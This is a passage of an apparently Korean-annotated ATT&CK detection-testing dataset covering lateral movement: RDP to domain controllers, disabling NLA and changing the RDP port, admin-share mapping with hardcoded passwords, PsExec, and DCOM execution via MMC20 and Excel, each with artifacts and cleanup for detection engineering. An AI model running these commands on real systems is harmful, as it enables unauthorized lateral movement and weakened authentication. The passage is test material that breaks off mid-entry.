        "mstsc /v:<Server> 명령을 실행해 도메인 컨트롤러에 RDP 연결을 시도한다.",
        "테스트 종료 후 mstsc 프로세스를 종료해 세션을 정리한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "$Server = $ENV:LOGONSERVER.TrimStart('\\'); $User = Join-Path $Env:USERDOMAIN $ENV:USERNAME; $Password = '1password2!'; cmdkey /generic:TERMSRV/$Server /user:$User /pass:$Password; mstsc /v:$Server"
        }
      ],
      "prerequisites": [
        "테스트 호스트가 Active Directory 도메인에 조인되어 있어야 한다.",
        "도메인 컨트롤러에서 RDP가 활성화되어 있고, 방화벽이 RDP 포트(기본 3389/TCP)를 허용해야 한다.",
        "사용자 계정이 대상 도메인 컨트롤러에 RDP 로그인 권한을 가져야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "RDP 연결 스크립트를 실행하는 PowerShell 프로세스",
            "commandline_pattern": "*cmdkey /generic:TERMSRV/* mstsc /v:*"
          },
          {
            "name": "cmdkey.exe",
            "description": "원격 RDP 서버에 대한 자격 증명을 Windows 자격 증명 관리자에 저장",
            "commandline_pattern": "cmdkey /generic:TERMSRV/*"
          },
          {
            "name": "mstsc.exe",
            "description": "도메인 컨트롤러에 대한 RDP(Remote Desktop) 세션을 생성",
            "commandline_pattern": "mstsc /v:*"
          }
        ],
        "network": [
          {
            "description": "도메인 컨트롤러에 대한 RDP 연결 트래픽",
            "protocol": "TCP",
            "port": 3389
          }
        ]
      },
      "cleanup": [
        "mstsc.exe 프로세스를 종료하여 RDP 세션을 중단한다.",
        "필요 시 cmdkey /delete:TERMSRV/<Server> 명령으로 저장된 RDP 자격 증명을 제거할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "355d4632-8cb9-449d-91ce-b566d0253d3e"
      }
    },
    {
      "test_id": "T1021.001-2",
      "name": "Changing RDP Port to Non Standard Port via PowerShell",
      "platforms": ["windows"],
      "summary": "PowerShell을 사용해 RDP 리스닝 포트를 기본값(3389)에서 비표준 포트(예: 4489)로 변경하고, 해당 포트를 허용하는 방화벽 규칙을 생성한다. 포트 기반 탐지를 우회하려는 시나리오를 모사한다.",
      "procedure": [
        "관리자 권한 PowerShell 세션을 연다.",
        "HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp 레지스트리 키의 PortNumber 값을 새 포트 번호(예: 4489)로 설정한다.",
        "New-NetFirewallRule를 사용해 새 포트에 대한 인바운드 TCP 허용 규칙 'RDPPORTLatest-TCP-In'을 생성한다.",
        "필요 시 TermService(원격 데스크톱 서비스)를 재시작해 변경 사항을 적용한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
          "command": "Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp' -Name 'PortNumber' -Value 4489; New-NetFirewallRule -DisplayName 'RDPPORTLatest-TCP-In' -Profile 'Public' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 4489"
        }
      ],
      "prerequisites": [
        "로컬 관리자 권한이 필요하다.",
        "PowerShell에서 Set-ItemProperty, New-NetFirewallRule cmdlet을 사용할 수 있어야 한다.",
        "시스템에서 RDP 서비스(TermService)가 실행 중이어야 포트 변경이 의미가 있다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [
          {
            "path": "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp",
            "description": "PortNumber 값이 기본 포트(3389)에서 비표준 포트(예: 4489)로 변경됨"
          }
        ],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "RDP 포트 변경 및 방화벽 규칙 생성 스크립트를 실행",
            "commandline_pattern": "*Set-ItemProperty*RDP-Tcp*PortNumber*New-NetFirewallRule*RDPPORTLatest-TCP-In*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "PortNumber 레지스트리 값을 원래 포트(기본 3389)로 되돌린다.",
        "생성한 방화벽 규칙 'RDPPORTLatest-TCP-In'을 제거한다.",
        "TermService(원격 데스크톱 서비스)를 재시작해 원래 설정을 적용한다."
      ],
      "metadata": {
        "atomic_source_id": "2f840dd4-8a2e-4f44-beb3-6b2399ea3771"
      }
    },
    {
      "test_id": "T1021.001-3",
      "name": "Changing RDP Port to Non Standard Port via Command Prompt",
      "platforms": ["windows"],
      "summary": "명령 프롬프트에서 reg와 netsh를 이용해 RDP 리스닝 포트를 변경하고 새 포트를 허용하는 방화벽 규칙을 추가한다. 동일한 설정 변경을 GUI 없이 레지스트리/방화벽 명령으로 수행하는 패턴이다.",
      "procedure": [
        "관리자 권한 cmd.exe를 실행한다.",
        "reg add 명령으로 HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp의 PortNumber 값을 새 포트(예: 4489)로 설정한다.",
        "netsh advfirewall firewall add rule 명령으로 새 포트를 허용하는 인바운드 규칙 'RDPPORTLatest-TCP-In'을 추가한다.",
        "테스트 후에는 레지스트리 값을 원래 포트로 되돌리고 방화벽 규칙을 삭제하며 TermService를 재시작한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber /t REG_DWORD /d 4489 /f && netsh advfirewall firewall add rule name=\"RDPPORTLatest-TCP-In\" dir=in action=allow protocol=TCP localport=4489"
        }
      ],
      "prerequisites": [
        "로컬 관리자 권한으로 cmd.exe를 실행해야 한다.",
        "레지스트리 편집(reg) 및 방화벽 구성(netsh advfirewall)이 허용되어야 한다.",
        "RDP 서비스가 활성화된 Windows 시스템이어야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [
          {
            "path": "HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp",
            "description": "PortNumber 값이 비표준 포트로 변경됨 (REG_DWORD)"
          }
        ],
        "processes": [
          {
            "name": "cmd.exe",
            "description": "레지스트리 수정과 방화벽 규칙 추가 명령을 실행",
            "commandline_pattern": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v PortNumber* && netsh advfirewall firewall add rule name=\"RDPPORTLatest-TCP-In\"*"
          },
          {
            "name": "reg.exe",
            "description": "RDP-Tcp 키의 PortNumber 값을 변경",
            "commandline_pattern": "reg add *RDP-Tcp*PortNumber*"
          },
          {
            "name": "netsh.exe",
            "description": "RDP 비표준 포트에 대한 인바운드 방화벽 규칙을 추가",
            "commandline_pattern": "netsh advfirewall firewall add rule name=\"RDPPORTLatest-TCP-In\"*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "reg add 명령으로 PortNumber 값을 기본 포트(3389)로 되돌린다.",
        "netsh advfirewall firewall delete rule name=\"RDPPORTLatest-TCP-In\" 명령으로 방화벽 규칙을 제거한다.",
        "net stop TermService 및 net start TermService로 RDP 서비스를 재시작한다."
      ],
      "metadata": {
        "atomic_source_id": "74ace21e-a31c-4f7d-b540-53e4eb6d1f73"
      }
    },
    {
      "test_id": "T1021.001-4",
      "name": "Disable NLA for RDP via Command Prompt",
      "platforms": ["windows"],
      "summary": "레지스트리의 UserAuthentication 값을 변경해 RDP의 네트워크 수준 인증(NLA)을 비활성화한다. 이를 통해 인증 이전 단계에서 로그인 화면에 직접 접근할 수 있어 공격 표면이 넓어진다.",
      "procedure": [
        "관리자 권한 cmd.exe를 실행한다.",
        "reg add 명령으로 HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp 키의 UserAuthentication 값을 0으로 설정한다.",
        "이후 RDP 접속 시 NLA 없이 로그인 화면에 접근 가능한 상태가 되는지 확인한다.",
        "테스트 종료 후에는 UserAuthentication 값을 원래 값(기본 1)으로 복원한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /d 0 /t REG_DWORD /f"
        }
      ],
      "prerequisites": [
        "로컬 관리자 권한이 필요하다.",
        "시스템에서 RDP가 활성화되어 있어야 하며, 해당 레지스트리 키가 존재해야 한다.",
        "환경에 따라 보안 정책 또는 보안 솔루션이 NLA 비활성화를 차단할 수 있다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [
          {
            "path": "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp",
            "description": "UserAuthentication 값이 0으로 변경되어 NLA가 비활성화됨"
          }
        ],
        "processes": [
          {
            "name": "cmd.exe",
            "description": "RDP-Tcp 키의 UserAuthentication 값을 변경하는 명령을 실행",
            "commandline_pattern": "reg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp\" /v UserAuthentication /d 0 /t REG_DWORD /f"
          },
          {
            "name": "reg.exe",
            "description": "RDP 세션의 인증 동작에 영향을 주는 UserAuthentication 레지스트리 값을 수정",
            "commandline_pattern": "reg add *UserAuthentication* /d 0*"
          }
        ],
        "network": []
      },
      "cleanup": [
        "UserAuthentication 레지스트리 값을 기본값(예: 1)으로 되돌려 NLA를 다시 활성화한다.",
        "변경 전 값을 알고 있을 경우 해당 값으로 정확히 복원하는 것이 바람직하다."
      ],
      "metadata": {
        "atomic_source_id": "01d1c6c0-faf0-408e-b368-752a02285cb2"
      }
    }
  ]
},
{
  "technique_id": "T1021.002",
  "technique_name": "Remote Services: SMB/Windows Admin Shares",
  "tactic": "Lateral Movement",
  "description": "SMB/Windows Admin Share(C$, ADMIN$, IPC$ 등)는 윈도우에서 기본 제공되는 관리용 공유 자원이다. 공격자는 관리자 권한 자격 증명을 이용해 원격 시스템의 Admin Share를 마운트하고, 파일 복사·명령 실행·툴 배포 등을 수행하며 측면 이동을 진행한다. PsExec와 같은 도구는 ADMIN$를 통해 바이너리를 전송하고 원격 서비스로 실행함으로써, 별도의 에이전트 없이도 원격 코드를 실행하는 데 자주 악용된다.",
  "tests": [
    {
      "test_id": "T1021.002-1",
      "name": "Map admin share (net use)",
      "platforms": ["windows"],
      "summary": "net use 명령을 사용해 원격 호스트의 관리 공유(C$, ADMIN$ 등)에 인증 후 연결하는 시나리오다. 도메인\\Administrator 계정과 비밀번호를 이용해 \\Target\\C$ 공유를 매핑해, 원격 파일 시스템에 직접 접근하는 패턴을 모사한다.",
      "procedure": [
        "공격자가 사용할 도메인 계정(DOMAIN\\Administrator)과 비밀번호를 준비한다.",
        "대상 호스트 이름(또는 IP)과 접근할 관리 공유 이름(C$, ADMIN$ 등)을 결정한다.",
        "cmd.exe에서 net use \\\\Target\\C$ P@ssw0rd1 /u:DOMAIN\\Administrator 명령을 실행하여 관리 공유에 연결한다.",
        "연결 성공 시 파일 탐색기 또는 명령줄에서 \\\\Target\\C$ 경로를 통해 원격 C: 드라이브에 접근할 수 있다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": false,
          "command": "cmd.exe /c \"net use \\\\Target\\C$ P@ssw0rd1 /u:DOMAIN\\Administrator\""
        }
      ],
      "prerequisites": [
        "대상 시스템에서 파일 및 프린터 공유(SMB, TCP 445)가 허용되어 있어야 한다.",
        "도메인 또는 로컬 관리자 자격 증명(DOMAIN\\Administrator 등)을 보유해야 한다.",
        "대상 호스트의 C$, ADMIN$ 등 Admin Share가 비활성화되지 않은 상태여야 한다.",
        "방화벽 또는 네트워크 보안 장비가 SMB 트래픽(TCP 445)을 차단하지 않아야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "cmd.exe",
            "description": "net use 명령을 통해 원격 Admin Share에 연결",
            "commandline_pattern": "cmd.exe /c \"net use \\\\*\\C$ * /u:*\""
          },
          {
            "name": "net.exe",
            "description": "SMB를 이용해 \\\\Target\\C$와 같은 관리 공유에 인증 후 세션 생성",
            "commandline_pattern": "net use \\\\Target\\C$ * /u:DOMAIN\\Administrator"
          }
        ],
        "network": [
          {
            "description": "로컬 호스트에서 Target 시스템으로의 SMB 세션 (Admin Share 접속)",
            "protocol": "TCP",
            "port": 445
          }
        ]
      },
      "cleanup": [
        "cmd.exe에서 net use \\\\Target\\C$ /delete 명령을 실행해 SMB 세션을 종료한다.",
        "자격 증명 캐시(Windows Credential Manager)에 저장된 관련 정보가 있는지 확인하고 필요 시 삭제한다."
      ],
      "metadata": {
        "atomic_source_id": "3386975b-367a-4fbb-9d77-4dcf3639ffd3"
      }
    },
    {
      "test_id": "T1021.002-2",
      "name": "Map Admin Share via PowerShell (New-PSDrive)",
      "platforms": ["windows"],
      "summary": "PowerShell의 New-PSDrive를 사용해 원격 관리 공유를 로컬 드라이브 문자(g:)로 매핑한다. 이후 g:\\ 경로를 통해 원격 C$에 직접 파일을 복사하고 실행할 수 있는 상황을 만든다.",
      "procedure": [
        "대상 호스트 이름(예: Target)과 관리 공유 이름(C$, ADMIN$ 등)을 정한다.",
        "PowerShell 세션을 연다.",
        "New-PSDrive -Name g -PSProvider FileSystem -Root \\\\Target\\C$ 명령을 실행한다.",
        "성공 시 g: 드라이브를 통해 원격 시스템의 C: 내용을 탐색할 수 있다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "New-PSDrive -Name g -PSProvider FileSystem -Root \\\\Target\\C$"
        }
      ],
      "prerequisites": [
        "대상 시스템에서 SMB(Admin Share)가 활성화되어 있어야 한다.",
        "공격자가 원격 시스템에 접근 가능한 자격 증명을 가지고 있어야 하며, 필요 시 PowerShell 세션에 해당 자격으로 로그인되어 있어야 한다.",
        "로컬 시스템의 PowerShell에서 New-PSDrive cmdlet을 사용할 수 있어야 한다."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "New-PSDrive를 이용해 원격 Admin Share를 로컬 드라이브에 매핑",
            "commandline_pattern": "powershell.exe *New-PSDrive -Name g -PSProvider FileSystem -Root \\\\Target\\C$*"
          }
        ],
        "network": [
          {
            "description": "PowerShell New-PSDrive에 의해 생성된 SMB 세션",
            "protocol": "TCP",
            "port": 445
          }
        ]
      },
      "cleanup": [
        "PowerShell에서 Remove-PSDrive -Name g 명령으로 매핑된 드라이브를 제거한다.",
        "활성 SMB 세션(net use 명령 등으로 확인 가능)을 모두 종료해 잔여 연결을 정리한다."
      ],
      "metadata": {
        "atomic_source_id": "514e9cd7-9207-4882-98b1-c8f791bae3c5"
      }
    },
    {
      "test_id": "T1021.002-3",
      "name": "Copy and Execute File with PsExec",
      "platforms": ["windows"],
      "summary": "Sysinternals PsExec 도구를 이용해 원격 호스트의 ADMIN$ 공유로 파일을 복사하고, 서비스 형태로 원격에서 실행한다. 에이전트 없는 원격 코드 실행 및 측면 이동에 자주 사용되는 패턴을 재현한다.",
      "procedure": [
        "Sysinternals에서 PsExec.exe를 다운로드해 로컬 디스크에 배치한다.",
        "원격 실행할 바이너리 경로(예: C:\\\\Windows\\\\System32\\\\cmd.exe)와 대상 호스트(\\\\localhost, \\\\Server 등)를 정한다.",
        "cmd.exe 또는 PowerShell에서 PsExec.exe \\\\localhost -accepteula -c C:\\\\Windows\\\\System32\\\\cmd.exe 명령을 실행한다.",
        "PsExec는 원격 ADMIN$ 공유를 통해 psexesvc 서비스를 생성하고, 지정한 바이너리를 원격에서 실행한다.",
        "원격 실행 완료 후 psexesvc 서비스와 관련 파일을 제거해 흔적을 줄일 수 있다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "C:\\\\Tools\\\\PsExec.exe \\\\localhost -accepteula -c C:\\\\Windows\\\\System32\\\\cmd.exe"
        }
      ],
      "prerequisites": [
        "테스트 호스트에 PsExec.exe가 존재해야 하며, 라이선스 동의를 위해 최초 실행 시 -accepteula 옵션을 사용해야 한다.",
        "원격 시스템에서 SMB(Admin Share)가 활성화되어 있어야 하며, 관리자 권한 자격 증명이 필요하다.",
        "방화벽이 원격 시스템의 TCP 445 포트를 허용해야 한다.",
        "로컬 사용자 계정에 원격 서비스 생성 및 관리 권한이 있어야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "\\\\localhost\\ADMIN$\\system32\\psexesvc.exe",
            "description": "PsExec가 원격 실행을 위해 ADMIN$ 공유에 전송하는 서비스 실행 파일(호스트에 따라 경로 변형 가능)"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "PsExec.exe",
            "description": "원격 시스템에 파일을 복사하고 psexesvc 서비스를 생성하여 명령을 실행",
            "commandline_pattern": "PsExec.exe \\\\* -accepteula -c C:\\\\Windows\\\\System32\\\\cmd.exe"
          },
          {
            "name": "cmd.exe",
            "description": "원격 호스트에서 PsExec에 의해 실행되는 명령 프롬프트 프로세스",
            "commandline_pattern": "cmd.exe"
          }
        ],
        "network": [
          {
            "description": "PsExec가 ADMIN$ 공유 및 서비스 관리를 위해 사용하는 SMB 통신",
            "protocol": "TCP",
            "port": 445
          }
        ]
      },
      "cleanup": [
        "PsExec 실행 시 자동 생성된 원격 서비스(psexesvc)를 제거한다(보통 PsExec가 종료 시 정리하지만, 필요 시 수동 확인).",
        "원격 호스트의 ADMIN$ 하위에 남아 있는 psexesvc.exe 또는 임시 파일을 삭제한다.",
        "추가 테스트 시를 대비해 PsExec 로그 및 이벤트 로그를 검토해 흔적을 파악할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "0eb03d41-79e4-4393-8e57-6344856be1cf"
      }
    },
    {
      "test_id": "T1021.002-4",
      "name": "Execute command writing output to local Admin Share",
      "platforms": ["windows"],
      "summary": "cmd.exe에서 로컬 Admin Share(\\\\127.0.0.1\\ADMIN$)로 명령 결과를 직접 리다이렉트하여 파일 출력하는 기법이다. 포스트 익스플로잇 프레임워크에서 원격 명령의 출력 결과를 관리자 공유로 회수할 때 사용되는 패턴과 유사하다.",
      "procedure": [
        "관리자 권한 cmd.exe를 실행한다.",
        "hostname 또는 기타 시스템 명령을 선택한다.",
        "cmd.exe /Q /c hostname 1> \\\\127.0.0.1\\ADMIN$\\output.txt 2>&1 명령을 실행한다.",
        "명령의 표준 출력 및 표준 오류가 C:\\\\Windows (ADMIN$ 루트)에 output.txt 파일로 기록된다.",
        "테스트 후 output.txt 파일을 확인하거나 삭제한다."
      ],
      "commands": [
        {
          "executor": "command_prompt",
          "elevation_required": true,
          "command": "cmd.exe /Q /c hostname 1> \\\\127.0.0.1\\ADMIN$\\output.txt 2>&1"
        }
      ],
      "prerequisites": [
        "로컬 시스템에서 ADMIN$ 공유가 활성화되어 있어야 한다(기본적으로 C:\\\\Windows에 매핑).",
        "명령 프롬프트를 관리자 권한으로 실행해야 ADMIN$에 쓰기가 가능하다.",
        "SMB 루프백(\\\\127.0.0.1\\ADMIN$) 접근이 보안 정책이나 로컬 방화벽에 의해 차단되지 않아야 한다."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "\\\\127.0.0.1\\ADMIN$\\output.txt",
            "description": "hostname 등 실행된 명령의 표준 출력 및 표준 오류가 기록된 결과 파일 (보통 C:\\\\Windows\\\\output.txt에 해당)"
          }
        ],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "cmd.exe",
            "description": "명령 실행 결과를 ADMIN$ 공유 경로로 리다이렉트",
            "commandline_pattern": "cmd.exe /Q /c * 1> \\\\127.0.0.1\\ADMIN$\\output.txt 2>&1"
          }
        ],
        "network": [
          {
            "description": "로컬 호스트(127.0.0.1)로의 SMB 루프백 연결 (ADMIN$ 공유 쓰기)",
            "protocol": "TCP",
            "port": 445
          }
        ]
      },
      "cleanup": [
        "C:\\\\Windows 폴더(또는 ADMIN$ 루트)에서 output.txt 파일을 삭제한다.",
        "로그/이벤트 분석을 위해 해당 파일의 생성·수정 시간을 메모해둘 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "d41aaab5-bdfe-431d-a3d5-c29e9136ff46"
      }
    }
  ]
},
{
  "technique_id": "T1021.003",
  "technique_name": "Remote Services: Distributed Component Object Model (DCOM)",
  "tactic": "Lateral Movement",
  "description": "DCOM(Distributed COM)은 원격 시스템의 COM 객체를 네트워크越 호출해 응용 프로그램 기능을 실행할 수 있게 하는 기술이다. 공격자는 DCOM을 이용해 mmc20, Excel 등 애플리케이션 COM 객체를 원격으로 생성하고, 그 객체를 통해 프로세스를 실행하거나 명령을 수행하며 측면 이동을 수행한다. 이때 별도의 에이전트 설치 없이도 원격 코드 실행이 가능해 탐지 난이도가 높아질 수 있다.",

  "tests": [
    {
      "test_id": "T1021.003-1",
      "name": "PowerShell Lateral Movement using MMC20",
      "platforms": ["windows"],
      "summary": "MMC20.application COM 객체를 DCOM으로 원격 생성해, ActiveView.ExecuteShellCommand를 통해 원격 시스템에서 calc.exe를 실행하는 측면 이동 시나리오이다. 별도 에이전트 없이 COM 호출만으로 원격 프로세스를 띄우는 패턴을 재현한다.",
      "procedure": [
        "목표 시스템의 호스트 이름 또는 IP(예: localhost, DC01)를 파악한다.",
        "PowerShell에서 [activator]::CreateInstance를 사용해 'MMC20.application' ProgID의 COM 객체를 원격 시스템 상에서 생성한다.",
        "생성된 MMC 문서의 ActiveView.ExecuteShellCommand 메서드를 호출하여 'c:\\\\windows\\\\system32\\\\calc.exe'를 실행한다.",
        "성공 시 대상 호스트에서 calc.exe 프로세스가 GUI 형태로 실행된다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "[activator]::CreateInstance([type]::GetTypeFromProgID('MMC20.application','localhost')).Document.ActiveView.ExecuteShellCommand('c:\\\\windows\\\\system32\\\\calc.exe', $null, $null, '7')"
        }
      ],
      "prerequisites": [
        "대상 시스템에서 DCOM이 활성화되어 있고, 방화벽이 RPC/DCOM 통신(TCP 135 및 동적 포트)을 허용해야 한다.",
        "공격자는 대상 시스템에서 MMC20.application COM 객체를 생성할 수 있을 정도의 권한(보통 로컬/도메인 사용자 또는 그 이상)을 가지고 있어야 한다.",
        "네이션 간 통신 시, 이름 해석(DNS/NetBIOS)이 정상 동작해야 한다.",
        "원격 실행되는 calc.exe는 c:\\\\windows\\\\system32\\\\calc.exe 경로에 존재해야 한다(기본값)."
      ],
      "artifacts": {
        "files_created": [],
        "files_read": [],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "로컬에서 DCOM을 통해 MMC20.application COM 객체를 생성하고 ExecuteShellCommand를 호출",
            "commandline_pattern": "powershell.exe *MMC20.application*ExecuteShellCommand*calc.exe*"
          },
          {
            "name": "mmc.exe",
            "description": "일부 환경에서 MMC20.application DCOM 호출 시 백그라운드 MMC 프로세스가 생성될 수 있음(로컬 또는 원격 이벤트로 관찰 가능)",
            "commandline_pattern": "mmc.exe"
          },
          {
            "name": "calc.exe",
            "description": "원격 대상 시스템에서 MMC20 COM 객체에 의해 실행되는 계산기 프로세스",
            "commandline_pattern": "c:\\\\windows\\\\system32\\\\calc.exe"
          }
        ],
        "network": [
          {
            "description": "DCOM/RPC를 이용한 원격 MMC20.application COM 객체 생성 및 제어 트래픽",
            "protocol": "TCP",
            "port": 135
          }
        ]
      },
      "cleanup": [
        "원격 시스템에서 실행된 calc.exe 프로세스를 종료한다(필요 시 원격 태스크 관리 또는 세션 종료).",
        "테스트 과정에서 사용한 PowerShell 명령 기록 및 이벤트 로그(Security, Sysmon, AppLocker 등)를 검토하고 실험 환경에서는 적절히 정리한다.",
        "DCOM 사용이 필요 없는 테스트 환경이라면 방화벽 또는 그룹 정책을 통해 원격 DCOM 호출을 제한할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "6dc74eb1-c9d6-4c53-b3b5-6f50ae339673"
      }
    },
    {
      "test_id": "T1021.003-2",
      "name": "PowerShell Lateral Movement Using Excel Application Object",
      "platforms": ["windows"],
      "summary": "Excel.Application COM 객체를 DCOM으로 원격 생성하고, ActivateMicrosoftApp 메서드를 악용해 foxprow.exe로 위장한 calc.exe를 실행하는 측면 이동 기법이다. 미리 대상 사용자 경로에 바이너리를 복사한 뒤, Excel COM 호출만으로 원격 실행을 유도한다.",
      "procedure": [
        "대상 사용자 계정 이름(예: admin)과 대상 호스트 이름 또는 IP(예: localhost)를 결정한다.",
        "로컬 또는 공유 경로에서 c:\\\\windows\\\\system32\\\\calc.exe를 C:\\\\users\\\\admin\\\\AppData\\\\local\\\\Microsoft\\\\WindowsApps\\\\foxprow.exe로 복사한다(테스트에서는 로컬 경로 기준).",
        "PowerShell에서 [System.Activator]::CreateInstance를 사용해 'Excel.Application' ProgID의 COM 객체를 원격 시스템에서 생성한다.",
        "생성된 Excel COM 객체에 대해 ActivateMicrosoftApp('5')를 호출해 특정 애플리케이션을 실행하게 한다(foxprow.exe가 연계될 수 있는 시나리오).",
        "성공 시 원격 대상 시스템에서 foxprow.exe(실제 calc.exe)가 실행된다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": false,
          "command": "copy c:\\\\windows\\\\system32\\\\calc.exe 'C:\\\\users\\\\admin\\\\AppData\\\\local\\\\Microsoft\\\\WindowsApps\\\\foxprow.exe'; $com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID('Excel.Application','localhost')); $com.ActivateMicrosoftApp('5')"
        }
      ],
      "prerequisites": [
        "대상 시스템에 Microsoft Excel이 설치되어 있어야 하며, Excel.Application COM ProgID가 등록되어 있어야 한다.",
        "대상 사용자 프로필 경로(C:\\\\Users\\\\<user>\\\\AppData\\\\local\\\\Microsoft\\\\WindowsApps)가 존재해야 한다.",
        "공격자가 foxprow.exe 파일을 대상 경로에 쓸 수 있을 만큼의 파일 시스템 권한을 보유해야 한다.",
        "원격 Excel.Application COM 객체를 생성할 수 있도록 DCOM/RPC가 허용된 환경이어야 한다(TCP 135 및 관련 포트)."
      ],
      "artifacts": {
        "files_created": [
          {
            "path": "C:\\\\users\\\\admin\\\\AppData\\\\local\\\\Microsoft\\\\WindowsApps\\\\foxprow.exe",
            "description": "원래 calc.exe를 복사해 만든 위장 실행 파일로, Excel DCOM 호출을 통해 원격 실행 대상이 됨"
          }
        ],
        "files_read": [
          {
            "path": "C:\\\\windows\\\\system32\\\\calc.exe",
            "description": "복사 원본으로 사용된 기본 계산기 실행 파일"
          }
        ],
        "registry_keys": [],
        "processes": [
          {
            "name": "powershell.exe",
            "description": "calc.exe를 foxprow.exe로 복사하고 Excel.Application DCOM 객체를 생성하는 스크립트 실행",
            "commandline_pattern": "powershell.exe *copy c:\\\\windows\\\\system32\\\\calc.exe*Excel.Application*ActivateMicrosoftApp*"
          },
          {
            "name": "EXCEL.EXE",
            "description": "원격 시스템에서 Excel.Application COM 객체 생성 시 관련 프로세스로 나타날 수 있음",
            "commandline_pattern": "EXCEL.EXE"
          },
          {
            "name": "foxprow.exe",
            "description": "실제로는 calc.exe를 복사한 파일로, 원격 시스템에서 실행되는 페이로드",
            "commandline_pattern": "C:\\\\users\\\\admin\\\\AppData\\\\local\\\\Microsoft\\\\WindowsApps\\\\foxprow.exe"
          }
        ],
        "network": [
          {
            "description": "Excel.Application COM 객체를 원격으로 생성·제어하기 위한 DCOM/RPC 트래픽",
            "protocol": "TCP",
            "port": 135
          }
        ]
      },
      "cleanup": [
        "C:\\\\users\\\\admin\\\\AppData\\\\local\\\\Microsoft\\\\WindowsApps\\\\foxprow.exe 파일을 삭제한다.",
        "원격 시스템에서 실행 중인 foxprow.exe 또는 calc.exe 프로세스를 종료한다.",
        "DCOM 테스트와 관련된 이벤트 로그 및 Excel 사용 흔적을 필요에 따라 수집·정리한다.",
        "향후 재발 방지를 위해 Excel DCOM 사용 권한 및 COM 보안 설정, 방화벽 정책을 검토할 수 있다."
      ],
      "metadata": {
        "atomic_source_id": "505f24be-1c11-4694-b614-e01ae1cd2570"
      }
    }
  ]
},
{
  "technique_id": "T1021.004",
  "technique_name": "Remote Services: SSH",
  "tactic": "Lateral Movement",
  "description": "이 기법은 SSH(Remote Shell)를 통해 원격 시스템에 접속·제어하는 방법으로, 자격 증명을 악용해 ESXi 등 서버에 지속적인 접근을 유지하거나 추가 명령 실행 인터페이스를 여는 데 사용된다. 공격자는 ESXi 호스트에서 비활성화된 SSH 서비스를 활성화해 이후 파일 업로드, 설정 변경, 추가 측면 이동 등에 활용할 수 있다.",

  "tests": [
    {
      "test_id": "T1021.004-1",
      "name": "ESXi - Enable SSH via PowerCLI",
      "platforms": ["windows"],
      "summary": "Windows에서 VMware PowerCLI 모듈을 사용해 ESXi 호스트에 접속하고, 관리 서비스 목록에서 TSM-SSH 서비스를 찾아 시작한다. 이를 통해 원래 비활성화되어 있던 ESXi SSH 서비스를 원격에서 활성화하는 시나리오를 재현한다.",
      "procedure": [
        "테스트에 사용할 ESXi 호스트 주소(vm_host), 계정(vm_user), 비밀번호(vm_pass)를 확인한다.",
        "PowerShell에서 VMware.PowerCLI 모듈을 로드하고, 인증서 경고/CEIP 설정을 비대화형 모드에 맞게 조정한다.",
        "Connect-VIServer 명령으로 ESXi 호스트에 접속한다.",
        "Get-VMHostService -VMHost <vm_host> 결과 중 Key가 'TSM-SSH'인 서비스를 찾는다.",
        "Start-VMHostService -Confirm:$false를 호출하여 TSM-SSH(SSH 서비스)를 시작한다."
      ],
      "commands": [
        {
          "executor": "powershell",
          "elevation_required": true,
